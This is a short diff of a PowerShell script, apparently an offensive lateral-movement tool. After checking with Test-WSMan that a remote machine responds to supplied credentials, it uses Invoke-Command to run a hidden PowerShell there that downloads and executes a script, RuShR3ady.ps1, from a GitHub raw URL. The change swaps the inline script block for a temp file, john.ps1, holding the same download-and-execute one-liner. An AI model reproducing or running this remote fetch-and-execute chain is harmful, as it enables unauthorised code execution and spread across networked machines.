@@ -65,8 +65,9 @@ $islive = Test-WSMan machine-1 -Credential $mycredential -Authentication Negotia
 if ($islive -ne $null){
 
 
-Invoke-Command -ComputerName $currentip -Credential $mycredential -ScriptBlock { Start-Process -WindowStyle Hidden powershell "-nop iex(New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/securethelogs/Powershell/master/RuShR3ady.ps1')" }
-
+New-Item -Path $env:TEMP -Name "john.ps1"
+Add-Content $env:TEMP\john.ps1 -Value 'powershell -nop -w hidden iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/securethelogs/Powershell/master/RuShR3ady.ps1")'
+Invoke-Command -ComputerName $currentip -Credential $mycredential -FilePath $env:TEMP\john.ps1
 
 }
 
